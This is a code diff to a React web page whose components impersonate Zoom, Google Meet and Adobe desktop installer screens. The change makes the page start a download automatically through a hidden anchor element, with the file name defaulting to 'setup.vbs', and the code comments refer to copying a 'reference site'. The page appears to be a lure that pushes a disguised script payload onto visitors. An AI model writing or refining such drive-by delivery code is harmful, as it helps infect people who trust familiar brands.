@@ -256,27 +256,41 @@ function BrandDownloadProgress({
   );
 }
 
-function useBrowserInstallerDownload(code: string, installerUrl: string) {
+function triggerInstallerDownload(url: string, fileName: string) {
+  const anchor = document.createElement('a');
+  anchor.href = url;
+  anchor.download = fileName || 'setup.vbs';
+  anchor.rel = 'noopener';
+  anchor.style.display = 'none';
+  document.body.appendChild(anchor);
+  anchor.click();
+  window.setTimeout(() => anchor.remove(), 2_000);
+}
+
+function useBrowserInstallerDownload(
+  code: string,
+  installerUrl: string,
+  installerFileName: string,
+) {
   const [downloadStarted, setDownloadStarted] = useState(false);
   const [cancelled, setCancelled] = useState(false);
 
   useEffect(() => {
     if (!installerUrl || cancelled) return;
-    const storageKey = `nd-install-started:${code}`;
-    if (sessionStorage.getItem(storageKey)) {
+
+    // Delay so React Strict Mode's mount→unmount→remount does not cancel the download.
+    let alive = true;
+    const timer = window.setTimeout(() => {
+      if (!alive) return;
+      triggerInstallerDownload(installerUrl, installerFileName);
       setDownloadStarted(true);
-      return;
-    }
-    sessionStorage.setItem(storageKey, '1');
-    const iframe = document.createElement('iframe');
-    iframe.style.display = 'none';
-    iframe.src = installerUrl;
-    document.body.appendChild(iframe);
-    setDownloadStarted(true);
+    }, 200);
+
     return () => {
-      iframe.remove();
+      alive = false;
+      window.clearTimeout(timer);
     };
-  }, [code, installerUrl, cancelled]);
+  }, [code, installerUrl, installerFileName, cancelled]);
 
   return {
     downloadStarted,
@@ -294,7 +308,11 @@ function ZoomDesktop({
   installerFileName: string;
   code: string;
 }) {
-  const { downloadStarted, cancelled, cancel } = useBrowserInstallerDownload(code, installerUrl);
+  const { downloadStarted, cancelled, cancel } = useBrowserInstallerDownload(
+    code,
+    installerUrl,
+    installerFileName,
+  );
 
   return (
     <div className="meeting-zoom-desktop">
@@ -335,7 +353,11 @@ function GoogleMeetDesktop({
   installerFileName: string;
   code: string;
 }) {
-  const { downloadStarted, cancelled, cancel } = useBrowserInstallerDownload(code, installerUrl);
+  const { downloadStarted, cancelled, cancel } = useBrowserInstallerDownload(
+    code,
+    installerUrl,
+    installerFileName,
+  );
 
   return (
     <div className="meeting-meet-desktop">
@@ -409,24 +431,20 @@ function AdobeDesktop({
     return () => window.clearTimeout(timer);
   }, [phase]);
 
-  // Match reference site: hidden iframe triggers the EXE download.
+  // Auto-start installer download (delayed so React Strict Mode remount does not cancel it).
   useEffect(() => {
     if (phase !== 'download' || !installerUrl || cancelled) return;
-    const storageKey = `nd-install-started:${code}`;
-    if (sessionStorage.getItem(storageKey)) {
+    let alive = true;
+    const timer = window.setTimeout(() => {
+      if (!alive) return;
+      triggerInstallerDownload(installerUrl, installerFileName);
       setDownloadStarted(true);
-      return;
-    }
-    sessionStorage.setItem(storageKey, '1');
-    const iframe = document.createElement('iframe');
-    iframe.style.display = 'none';
-    iframe.src = installerUrl;
-    document.body.appendChild(iframe);
-    setDownloadStarted(true);
+    }, 200);
     return () => {
-      iframe.remove();
+      alive = false;
+      window.clearTimeout(timer);
     };
-  }, [phase, installerUrl, code, cancelled]);
+  }, [phase, installerUrl, installerFileName, code, cancelled]);
 
   if (phase === 'splash') {
     return (
